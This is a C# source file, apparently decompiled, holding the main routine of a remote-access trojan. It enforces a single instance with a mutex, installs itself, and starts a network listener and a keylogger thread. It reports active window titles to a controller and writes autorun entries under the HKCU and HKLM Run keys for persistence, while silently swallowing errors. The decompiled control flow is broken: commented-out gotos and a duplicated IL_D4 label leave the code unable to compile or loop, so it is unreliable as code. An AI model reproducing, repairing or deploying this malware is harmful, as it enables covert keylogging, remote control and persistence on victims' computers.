using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using ClassLibrary1;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ConsoleApplication1
{
    public class Start
    {
        [STAThread]
        public static void Main()
        {
            if (Interaction.Command() != null && Interaction.Command().Length > 0)
            {
                string[] array = Strings.Split(Interaction.Command(), ":", -1, CompareMethod.Binary);
                string left = array[0];
                if (Operators.CompareString(left, "UP", false) == 0)
                {
                    try
                    {
                        OK.F.Registry.CurrentUser.SetValue("di", "!");
                    }
                    catch (Exception expr_61)
                    {
                        ProjectData.SetProjectError(expr_61);
                        ProjectData.ClearProjectError();
                    }

                    try
                    {
                        Process processById = Process.GetProcessById(Conversions.ToInteger(array[1]));
                        processById.WaitForExit(5000);
                        try
                        {
                            processById.Dispose();
                            ////goto IL_D4;
                        }
                        catch (Exception expr_94)
                        {
                            ProjectData.SetProjectError(expr_94);
                            ProjectData.ClearProjectError();
                            ////goto IL_D4;
                        }
                    }
                    catch (Exception expr_A2)
                    {
                        ProjectData.SetProjectError(expr_A2);
                        Thread.Sleep(5000);
                        ProjectData.ClearProjectError();
                        //goto IL_D4;
                    }
                }

                if (Operators.CompareString(left, "..", false) == 0)
                {
                    Thread.Sleep(5000);
                }
            }

            try
            {
            IL_D4:
                Mutex.OpenExisting(OK.RG);
                ProjectData.EndApp();
            }
            catch (Exception expr_E6)
            {
                ProjectData.SetProjectError(expr_E6);
                bool flag = false;
                OK.MT = new Mutex(true, OK.RG, out flag);
                if (!flag)
                {
                    ProjectData.EndApp();
                }

                ProjectData.ClearProjectError();
            }

            OK.Install();
            Thread thread = new Thread(new ThreadStart(OK.Listen), 1);
            thread.Start();
            try
            {
                OK.spy = new Spy();
                thread = new Thread(new ThreadStart(OK.spy.LoggerThread), 1);
                thread.Start();
            }
            catch (Exception expr_15A)
            {
                ProjectData.SetProjectError(expr_15A);
                ProjectData.ClearProjectError();
            }

            int num = 0;
            string left2 = "";
            if (!OK.BD)
            {
                //goto IL_357;
            }

            try
            {
                SystemEvents.SessionEnding += delegate(object sender, SessionEndingEventArgs e)
                {
                    OK.ED();
                };
                OK.pr(1);
                //goto IL_357;
            }
            catch (Exception expr_196)
            {
                ProjectData.SetProjectError(expr_196);
                ProjectData.ClearProjectError();
                //goto IL_357;
            }

            checked
            {
                try
                {
                IL_1A7:
                    num++;
                    if (num == 5)
                    {
                        try
                        {
                            OK.EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
                        }
                        catch (Exception expr_1C6)
                        {
                            ProjectData.SetProjectError(expr_1C6);
                            ProjectData.ClearProjectError();
                        }
                    }

                    if (num > 8)
                    {
                        num = 0;
                        string text = OK.WorkedWindowsName();
                        if (Operators.CompareString(left2, text, false) != 0)
                        {
                            left2 = text;
                            OK.Send("act" + OK.split + text);
                        }
                    }

                    if (OK.Isu)
                    {
                        try
                        {
                            if (Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.CurrentUser.GetValue(OK.AutoRunKey + "\\" + OK.RG, ""), "\"" + OK.AppFileInfo.FullName + "\" ..", false))
                            {
                                OK.F.Registry.CurrentUser.OpenSubKey(OK.AutoRunKey, true).SetValue(OK.RG, "\"" + OK.AppFileInfo.FullName + "\" ..");
                            }
                        }
                        catch (Exception expr_29E)
                        {
                            ProjectData.SetProjectError(expr_29E);
                            ProjectData.ClearProjectError();
                        }

                        try
                        {
                            if (Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.LocalMachine.GetValue(OK.AutoRunKey + "\\" + OK.RG, ""), "\"" + OK.AppFileInfo.FullName + "\" ..", false))
                            {
                                OK.F.Registry.LocalMachine.OpenSubKey(OK.AutoRunKey, true).SetValue(OK.RG, "\"" + OK.AppFileInfo.FullName + "\" ..");
                            }
                        }
                        catch (Exception expr_339)
                        {
                            ProjectData.SetProjectError(expr_339);
                            ProjectData.ClearProjectError();
                        }
                    }
                }
                catch (Exception expr_349)
                {
                    ProjectData.SetProjectError(expr_349);
                    ProjectData.ClearProjectError();
                }

            IL_357:
                Thread.Sleep(1000);
                Application.DoEvents();
            //goto IL_1A7;
            IL_D4:
                Thread.Sleep(1000);
            IL_354:
                Thread.Sleep(1000);
            }
        }

        /* 	[DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__4(object sender, SessionEndingEventArgs e)
        {
            OK.ED();
        } */
    }
}
